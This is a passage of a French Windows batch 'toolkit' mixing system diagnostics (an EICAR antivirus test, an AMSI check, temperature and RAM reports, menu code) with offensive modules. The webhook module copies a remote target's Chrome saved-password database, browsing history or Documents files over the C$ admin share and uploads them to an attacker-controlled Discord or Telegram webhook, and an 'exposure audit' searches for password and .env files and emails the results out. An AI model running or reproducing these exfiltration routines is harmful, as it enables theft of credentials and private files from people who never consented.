echo 45 49 43 41 52 2d 53 54 41 4e 44 41 52 44 2d 41 4e 54 49 56 49 52 55 53 2d 54 45 53 54 2d 46 49 4c 45 21 24 48 2b 48 2a >> "%TEMP%\hx.txt"
certutil.exe -decodehex "%TEMP%\hx.txt" "%AVTEST_DIR%\eicar_test.txt" >nul 2>&1
del /f /q "%TEMP%\hx.txt" >nul 2>&1

echo  Verification locale par l'Antivirus...
ping 127.0.0.1 -n 3 >nul

if exist "%AVTEST_DIR%\eicar_test.txt" (
    echo  [!] ECHEC : L'Antivirus a laisse passer le fichier.
    echo  Il n'y a pas de protection en temps reel activee.
) else (
    echo  [X] BLOQUE REUSSI : L'Antivirus a intercepte et supprime le fichier
    echo  en quelques millisecondes ! ^(Regardez vos alertes Windows Defender^).
)
echo.
echo  --------------------------------------------------------
echo  RESULTAT :
echo  Si le fichier a ete supprime et qu'une alerte ROUGE apparait,
echo  LE TEST EST UN SUCCES ABSOLU !
echo  --------------------------------------------------------
echo.
echo  Appuyez sur une touche pour NETTOYER LE DOSSIER DU BUREAU et revenir...
pause >nul
if exist "%AVTEST_DIR%\eicar_test.txt" del /f /q "%AVTEST_DIR%\eicar_test.txt" >nul 2>&1
rd /s /q "%AVTEST_DIR%" >nul 2>&1
goto sys_av_test

:av_launcher_heur
cls
echo.
echo  ================================================
echo   TEST EN DIRECT : COMPORTEMENT HEURISTIQUE
echo.
echo  Lancement d'une macro Powershell avec des patterns heuristiques AMSI...
echo  (Injection d'un payload virtuel teste par l'Antivirus en memoire)
echo.
echo  Si votre Antivirus analyse la memoire en temps reel (AMSI),
echo  IL BLOQUERA le script dans cette console au moment de l'injection !
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "Write-Host 'Simulation AMSI en cours...' -f Yellow; try { $s = [String]::Join('', [char[]]@(65,77,83,73,32,84,101,115,116,32,83,97,109,112,108,101,58,32,55,101,55,50,99,51,99,101,45,56,54,49,98,45,52,51,53,57,45,56,55,52,48,45,48,97,99,49,52,56,52,99,49,51,56,54)); Invoke-Expression $s 2>$null; Write-Host '--- ECHEC : L''Antivirus a laisse passer l''attaque memoire ! ---' -f Red } catch { Write-Host '--- SUCCES : L''Antivirus a parfaitement intercepte l''attaque ! ---' -f Green }"
echo.
echo  --------------------------------------------------------
echo  RESULTAT ATTENDU : Une erreur ROUGE PowerShell ci-dessus indique
echo  que votre Antivirus fonctionne et bloque les scripts suspects.
echo  --------------------------------------------------------
echo.
echo  Appuyez sur une touche pour NETTOYER et revenir au menu...
pause >nul
goto sys_av_test

:av_clean
cls
echo.
echo  Suppression des fichiers de test...
set "AVTEST_DIR=%USERPROFILE%\Desktop\Test_Antivirus"
set "OLD_AV_DIR=%USERPROFILE%\Desktop\AV_Tests"
if exist "%AVTEST_DIR%" rd /s /q "%AVTEST_DIR%" >nul 2>&1
if exist "%OLD_AV_DIR%" rd /s /q "%OLD_AV_DIR%" >nul 2>&1
if exist "%TEMP%\e_part.b64" del /f /q "%TEMP%\e_part.b64" >nul 2>&1
if exist "%TEMP%\e_archive.zip" del /f /q "%TEMP%\e_archive.zip" >nul 2>&1
if exist "%TEMP%\e_ext" rd /s /q "%TEMP%\e_ext" >nul 2>&1
echo  [OK] Dossiers de test supprimes du Bureau.
echo.
pause
goto sys_av_test

:sys_temp_report
cls
echo =============================================================
echo               RAPPORT DE TEMPERATURE CPU/GPU
echo =============================================================
echo.
echo Recherche des capteurs de temperature...
echo.
set "TPR_PS=%TEMP%\sys_temp_report.ps1"
if exist "%TPR_PS%" del "%TPR_PS%"
>  "%TPR_PS%" echo function Get-TempStatus { param($temp) if ($temp -lt 60) { return @{ Status = 'OK'; Color = 'Green' } } elseif ($temp -lt 80) { return @{ Status = 'Acceptable'; Color = 'Yellow' } } elseif ($temp -lt 90) { return @{ Status = 'Elevee'; Color = 'DarkYellow' } } else { return @{ Status = 'Critique'; Color = 'Red' } } }
>> "%TPR_PS%" echo function Get-ZoneLabel { param($name) $n = $name.ToUpper(); if ($n -match 'CPU^|PROC^|TZX^|TZ0') { return 'CPU' } elseif ($n -match 'GPU^|VGA^|VIDEO^|DISP') { return 'GPU' } elseif ($n -match 'SSD^|HDD^|DISK^|NVME^|STOR') { return 'Stockage' } elseif ($n -match 'BAT^|BATT') { return 'Batterie' } elseif ($n -match 'TZS^|SYS^|AMB^|SKIN^|CASE') { return 'Systeme/Carte mere' } elseif ($n -match 'PWR^|VRM^|MOSFET') { return 'Alimentation/VRM' } else { return 'Capteur systeme' } }
>> "%TPR_PS%" echo $found = $false
>> "%TPR_PS%" echo try {
>> "%TPR_PS%" echo     $ohm = Get-CimInstance -Namespace 'root/OpenHardwareMonitor' -ClassName Sensor -ErrorAction Stop
>> "%TPR_PS%" echo     $temps = $ohm ^| Where-Object { $_.SensorType -eq 'Temperature' }
>> "%TPR_PS%" echo     if ($temps) {
>> "%TPR_PS%" echo         $found = $true
>> "%TPR_PS%" echo         Write-Host 'Source : OpenHardwareMonitor (precis)' -f Green
>> "%TPR_PS%" echo         $temps ^| ForEach-Object {
>> "%TPR_PS%" echo             $status = Get-TempStatus -temp $_.Value
>> "%TPR_PS%" echo             $label = Get-ZoneLabel -name $_.Name
>> "%TPR_PS%" echo             Write-Host -NoNewline ('   [' + $label + '] ' + $_.Name + ' : ' + $_.Value + ' C')
>> "%TPR_PS%" echo             Write-Host (' - ' + $status.Status) -f $status.Color
>> "%TPR_PS%" echo         }
>> "%TPR_PS%" echo     }
>> "%TPR_PS%" echo } catch {}
>> "%TPR_PS%" echo try {
>> "%TPR_PS%" echo     $ctr = Get-Counter '\Thermal Zone Information(*)\Temperature' -ErrorAction Stop
>> "%TPR_PS%" echo     $ctr.CounterSamples ^| ForEach-Object {
>> "%TPR_PS%" echo         $tempK = $_.CookedValue; $tempC = [math]::Round($tempK - 273.15, 1)
>> "%TPR_PS%" echo         if ($tempC -gt 0 -and $tempC -lt 150) {
>> "%TPR_PS%" echo             $found = $true
>> "%TPR_PS%" echo             $label = Get-ZoneLabel -name $_.InstanceName
>> "%TPR_PS%" echo             $status = Get-TempStatus -temp $tempC
>> "%TPR_PS%" echo             Write-Host -NoNewline ('   [' + $label + '] ' + $_.InstanceName + ' : ' + $tempC + ' C')
>> "%TPR_PS%" echo             Write-Host (' - ' + $status.Status) -f $status.Color
>> "%TPR_PS%" echo         }
>> "%TPR_PS%" echo     }
>> "%TPR_PS%" echo } catch {}
>> "%TPR_PS%" echo if (-not $found) {
>> "%TPR_PS%" echo     try {
>> "%TPR_PS%" echo         $wmi = Get-CimInstance -Namespace 'root/WMI' -ClassName MSAcpi_ThermalZoneTemperature -ErrorAction Stop
>> "%TPR_PS%" echo         if ($wmi) {
>> "%TPR_PS%" echo             Write-Host 'Source : ACPI/WMI (zones generiques BIOS)' -f Yellow
>> "%TPR_PS%" echo             Write-Host 'Note   : Pour CPU/GPU precis, installez LibreHardwareMonitor' -f DarkGray
>> "%TPR_PS%" echo             $wmi ^| ForEach-Object {
>> "%TPR_PS%" echo                 $temp = [math]::Round(($_.CurrentTemperature - 2732) / 10, 1)
>> "%TPR_PS%" echo                 $label = Get-ZoneLabel -name $_.InstanceName
>> "%TPR_PS%" echo                 $status = Get-TempStatus -temp $temp
>> "%TPR_PS%" echo                 Write-Host -NoNewline ('   [' + $label + '] ' + $_.InstanceName + ' : ' + $temp + ' C')
>> "%TPR_PS%" echo                 Write-Host (' - ' + $status.Status) -f $status.Color
>> "%TPR_PS%" echo             }
>> "%TPR_PS%" echo         } else { Write-Host 'Aucun capteur accessible.' -f Red }
>> "%TPR_PS%" echo     } catch { Write-Host 'Impossible d''acceder aux capteurs WMI.' -f Red }
>> "%TPR_PS%" echo }
powershell -NoProfile -ExecutionPolicy Bypass -File "%TPR_PS%"
if exist "%TPR_PS%" del "%TPR_PS%" >nul 2>&1
echo.
pause
goto sys_diagnostic_menu

:sys_ram_check
cls
echo =============================================================
echo               VERIFICATEUR DE MEMOIRE VIVE (RAM)
echo =============================================================
echo.
echo Analyse de la memoire installee et des capacites de la carte mere...
echo.
set "RAM_PS=%TEMP%\sys_ram_check.ps1"
if exist "%RAM_PS%" del "%RAM_PS%"
>  "%RAM_PS%" echo $mem = Get-CimInstance Win32_PhysicalMemory -ErrorAction SilentlyContinue
>> "%RAM_PS%" echo $mobo = Get-CimInstance Win32_PhysicalMemoryArray -ErrorAction SilentlyContinue
>> "%RAM_PS%" echo if ($mobo) {
>> "%RAM_PS%" echo     $maxCap = [math]::Round($mobo.MaxCapacity / 1024 / 1024, 2)
>> "%RAM_PS%" echo     Write-Host ('Capacite maximale supportee : ' + $maxCap + ' Go') -f Cyan
>> "%RAM_PS%" echo     Write-Host ('Nombre de slots memoire    : ' + $mobo.MemoryDevices) -f Cyan
>> "%RAM_PS%" echo } else {
>> "%RAM_PS%" echo     Write-Host 'Impossible de determiner les capacites de la carte mere.' -f Yellow
>> "%RAM_PS%" echo }
>> "%RAM_PS%" echo Write-Host ''
>> "%RAM_PS%" echo if ($mem) {
>> "%RAM_PS%" echo     $totalSticks = $mem.Count
>> "%RAM_PS%" echo     Write-Host ('Barrettes de RAM installees  : ' + $totalSticks) -f Cyan
>> "%RAM_PS%" echo     Write-Host ''
>> "%RAM_PS%" echo     Write-Host 'Details par barrette :' -f Green
>> "%RAM_PS%" echo     $solderedCount = 0
>> "%RAM_PS%" echo     $mem ^| ForEach-Object {
>> "%RAM_PS%" echo         $cap = [math]::Round($_.Capacity / 1GB, 0)
>> "%RAM_PS%" echo         if ($_.DeviceLocator -like '*on board*') { $solderedCount++ }
>> "%RAM_PS%" echo         Write-Host ('  - Slot ' + $_.DeviceLocator + ': ' + $cap + ' Go - ' + $_.PartNumber)
>> "%RAM_PS%" echo     }
>> "%RAM_PS%" echo     Write-Host ''
>> "%RAM_PS%" echo     if ($totalSticks -gt 0) {
>> "%RAM_PS%" echo         if ($solderedCount -eq $totalSticks) {
>> "%RAM_PS%" echo             Write-Host 'Conclusion : Toute la memoire RAM est soudee a la carte mere et ne peut pas etre remplacee.' -f Red
>> "%RAM_PS%" echo         } elseif ($solderedCount -gt 0) {
>> "%RAM_PS%" echo             Write-Host 'Conclusion : Une partie de la memoire RAM est soudee. Les autres barrettes peuvent potentiellement etre remplacees.' -f Yellow
>> "%RAM_PS%" echo         } else {
>> "%RAM_PS%" echo             Write-Host 'Conclusion : La memoire RAM est sur des barrettes remplacables (non soudee).' -f Green
>> "%RAM_PS%" echo         }
>> "%RAM_PS%" echo     }
>> "%RAM_PS%" echo } else {
>> "%RAM_PS%" echo     Write-Host 'Impossible de lister les barrettes de RAM installees.' -f Yellow
>> "%RAM_PS%" echo }
powershell -NoProfile -ExecutionPolicy Bypass -File "%RAM_PS%"
if exist "%RAM_PS%" del "%RAM_PS%" >nul 2>&1
echo.
pause
goto sys_diagnostic_menu


REM ===================================================================
:reload_fav_cache
REM Charge les favoris en memoire pour eviter N lectures de fichier par menu
for /f "tokens=1 delims==" %%V in ('set fav_ 2^>nul') do set "%%V="
if exist "%SCRIPT_DIR%\favoris.txt" (
    for /f "usebackq tokens=*" %%F in ("%SCRIPT_DIR%\favoris.txt") do set "fav_%%F=1"
)
exit /b
REM ===================================================================

:ToggleFav
set "tf_target=%~1"
if not defined tf_target exit /b
set "was_removed=0"
set "FAV_FILE=%SCRIPT_DIR%\favoris.txt"
set "FAV_TMP=%SCRIPT_DIR%\favoris_tmp.txt"
if exist "%FAV_TMP%" del "%FAV_TMP%"
if exist "%FAV_FILE%" (
    for /f "usebackq tokens=*" %%F in ("%FAV_FILE%") do (
        if "%%F"=="!tf_target!" (
            set "was_removed=1"
        ) else (
            echo %%F>>"%FAV_TMP%"
        )
    )
)
if "!was_removed!"=="0" echo !tf_target!>>"%FAV_TMP%"
if exist "%FAV_TMP%" (move /y "%FAV_TMP%" "%FAV_FILE%" >nul) else (type nul > "%FAV_FILE%")
exit /b

REM ===================================================================
REM       MODULE D'EXFILTRATION VIA WEBHOOK (HTTPS)
REM ===================================================================
:cyber_exfiltrate_webhook
cls
echo.
echo  ================================================
echo   EXFILTRATION VIA WEBHOOK (DISCORD/TELEGRAM)
echo  ================================================
echo.
echo   Description : Envoie les fichiers volés directement
echo   sur un salon Discord ou un bot Telegram.
echo.
set /p "web_url=Collez votre URL Webhook : "
if "%web_url%"=="" goto smb_exp_menu

echo [i] Dossiers utilisateurs sur la cible :
dir "\\%target_ip%\C$\Users" /B /A:D 2^>nul
set /p "user_target=Utilisateur cible : "
if not defined user_target goto smb_exp_menu
echo.
echo [1] Exfiltrer Mots de passe Chrome/Edge (hashes)
echo [2] Exfiltrer Historique de navigation
echo [3] Exfiltrer Dossier Documents (*.pdf, *.docx)
echo [4] Retour
echo.
set /p "exf_choice=Choix : "

if "%exf_choice%"=="1" set "target_file=\\%target_ip%\C$\Users\%user_target%\AppData\Local\Google\Chrome\User Data\Default\Login Data"
if "%exf_choice%"=="2" set "target_file=\\%target_ip%\C$\Users\%user_target%\AppData\Local\Google\Chrome\User Data\Default\History"
if "%exf_choice%"=="3" (
    echo [i] Compression et envoi en cours...
    powershell -Command "$zip='%TEMP%\dump.zip'; Compress-Archive -Path '\\%target_ip%\C$\Users\%user_target%\Documents\*.pdf' -DestinationPath $zip -Force; Invoke-RestMethod -Uri '%web_url%' -Method Post -InFile $zip -ContentType 'application/zip'"
    echo [OK] Documents envoyes sur votre salon.
    pause & goto smb_exp_menu
)
if "%exf_choice%"=="4" goto smb_exp_menu

if defined target_file (
    echo [i] Envoi du fichier sensible...
    powershell -Command "Invoke-RestMethod -Uri '%web_url%' -Method Post -InFile '%target_file%' -ContentType 'application/octet-stream'"
    echo [OK] Fichier envoye.
)
pause & goto smb_exp_menu

:cyber_exposure_audit
cls
echo %R%  [!] MODULE D'AUDIT D'EXPOSITION DES DONNEES %N%
echo.
if "!user_target!"=="" set /p "user_target=Nom de l'utilisateur cible : "
set "REPORT_FILE=%TEMP%\exposure_report.txt"

echo [i] Analyse des fichiers sensibles en cours...
(
echo --- RAPPORT D'EXPOSITION (ALEEXLEDEV) ---
echo Date : %date% %time%
echo Cible : %target_ip%
echo.
echo [1] Recherche de fichiers 'password' ou 'config' :
dir "\\%target_ip%\C$\Users\%user_target%\Documents\*pass*" /S /B 2>nul
dir "\\%target_ip%\C$\Users\%user_target%\Desktop\*.env" /S /B 2>nul
) > "%REPORT_FILE%"

REM --- Envoi du rapport par Mail (Utilise tes credentials SMTP) ---
if defined SMTP_USER (
    echo [i] Envoi du rapport a %EMAIL_TO%...
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $p = ConvertTo-SecureString '%SMTP_PASS%' -AsPlainText -Force; $c = New-Object System.Management.Automation.PSCredential('%SMTP_USER%',$p); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $c -From '%SMTP_USER%' -To '%EMAIL_TO%' -Subject 'Audit Exposition : %target_ip%' -Body 'Rapport en piece jointe' -Attachments '%REPORT_FILE%'"
    echo [OK] Mail envoye.
) else (
    echo [!] SMTP non configure. Rapport disponible dans %TEMP%.
)
pause & goto smb_exp_menu

:cyber_wifi_audit
cls
echo %B%  [ Wi-Fi SECURITY ANALYZER ] %N%
echo.
echo [i] Analyse des ondes radio...
netsh wlan show networks mode=bssid | findstr "SSID Authentication Signal"
echo.
echo %Y%[!] CONSEIL : Si vous voyez deux SSID identiques dont l'un est 'Open', %N%
echo %Y%il s'agit probablement d'une attaque Evil Twin active.%N%
pause & goto net_cyber_menu

REM ===================================================================
REM        FONCTION D'ENVOI DE MAIL (SMTP POWERSHELL)
REM ===================================================================
:SendAuditMail
set "ATTACHMENT=%~1"
set "SUBJECT_SUFFIX=%~2"

if "%SMTP_USER%"=="" (
    echo [!] Erreur : SMTP_USER non defini dans credentials.txt.
    exit /b
)

echo [i] Preparation de l'email via smtp.gmail.com...
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $p = ConvertTo-SecureString '%SMTP_PASS%' -AsPlainText -Force; $c = New-Object System.Management.Automation.PSCredential('%SMTP_USER%',$p); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $c -From '%SMTP_USER%' -To '%EMAIL_TO%' -Subject 'ALEEXLEDEV - Audit !SUBJECT_SUFFIX! (%target_ip%)' -Body 'Ci-joint le rapport d audit genere par la Golden Edition v3.5.' -Attachments '!ATTACHMENT!'"

if %errorlevel% equ 0 (
    echo %G%[ OK ] Rapport envoye avec succes a %EMAIL_TO%%N%
) else (
    echo %R%[ ERR ] Echec de l envoi (Verifiez mot de passe application Gmail)%N%
)
exit /b

REM ===================================================================
REM  :AutoMenu - Moteur unifie de menus dynamiques avec favoris globaux
REM  Usage : call :AutoMenu "TITRE" "label1;label2;[--- SECTION ---];label3" "NONUMS"
REM ===================================================================
:AutoMenu
set "am_title=%~1"
set "am_labels=%~2"
set "am_flags=%~3"

:am_loop
call :reload_fav_cache
set "am_opts="
set /a am_idx=0
set "remain=%am_labels%"

:am_parse
for /f "tokens=1* delims=;" %%A in ("%remain%") do (
    set "lbl=%%A"
    set "remain=%%B"

    if "!lbl:~0,4!"=="[---" (
        set "am_opts=!am_opts!;!lbl!"
    ) else (
        set /a am_idx+=1
        set "am_target[!am_idx!]=!lbl!"

        REM Recuperer le titre via la map globale (double expansion)
        call set "entry=%%map_!lbl!%%"
        if not defined entry set "entry=!lbl!"

        REM Verifier si c est un favori
        set "is_f=0"
        if defined fav_!lbl! set "is_f=1"

        if "!is_f!"=="1" (
            set "am_opts=!am_opts!;(F) !entry!"
        ) else (
            set "am_opts=!am_opts!;!entry!"
        )
    )
)
if defined remain goto am_parse
set "am_opts=!am_opts:~1!"

call :DynamicMenu "%am_title%" "!am_opts!" "%am_flags%"
set "am_c=!errorlevel!"

if "!am_c!"=="0" exit /b 0
if "!am_c!"=="299" goto search_tools

if !am_c! GEQ 200 (
    set /a t_idx=!am_c!-200
    for %%X in (!t_idx!) do call :ToggleFav "!am_target[%%X]!"
    goto am_loop
)

for %%X in (!am_c!) do set "AutoMenu_Target=!am_target[%%X]!"
exit /b 1

REM ===================================================================
REM                         FIN DU SCRIPT
REM ===================================================================
